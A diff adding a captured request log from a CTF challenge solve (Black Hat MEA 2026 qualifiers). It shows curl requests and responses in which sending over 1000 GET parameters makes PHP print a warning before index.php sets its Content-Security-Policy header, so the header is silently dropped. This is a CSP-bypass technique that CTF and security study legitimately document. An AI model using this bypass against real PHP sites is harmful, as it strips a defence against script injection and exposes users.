@@ -1,0 +1,43 @@
+Captured live against http://ceff47d53625d4b2552bc6d0b043284c.playat.flagyard.com
+(Black Hat MEA CTF Qualification 2026, FlagYard) during the solve, 2026-09-05.
+The public instance is ephemeral and has since been torn down.
+
+================================================================================
+[1] NORMAL request -- the locked-down CSP is present on every page:
+================================================================================
+$ curl -s -i 'http://<host>/?p=home' | head
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Security-Policy: default-src 'none'; script-src 'nonce-9c84c7d8ef57e68e0bd92f46ee4dc1be'; style-src 'nonce-9c84c7d8ef57e68e0bd92f46ee4dc1be'; img-src 'self'; base-uri 'none';
+Referrer-Policy: no-referrer
+
+================================================================================
+[2] PAYLOAD request -- >1000 GET params: the PHP warning is emitted during
+    input parsing, BEFORE index.php calls header(), so the CSP header is never
+    set. Note the missing Content-Security-Policy and the "headers already sent"
+    warning printed above the document.
+================================================================================
+$ curl -s -i 'http://<host>/?p=view&dir=docs/%253&file=c...&z1=1&...&z1001=1' | head -30
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Referrer-Policy: no-referrer
+
+<br />
+<b>Warning</b>:  PHP Request Startup: Input variables exceeded 1000. To increase the limit change max_input_vars in php.ini. in <b>Unknown</b> on line <b>0</b><br />
+<br />
+<b>Warning</b>:  Cannot modify header information - headers already sent in <b>/app/public/index.php</b> on line <b>3</b><br />
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Lumen</title>
+<style nonce="d231d6136c12db4d4acfe0d907f42cd4">
+  ...
+</style>
+</head>
+...
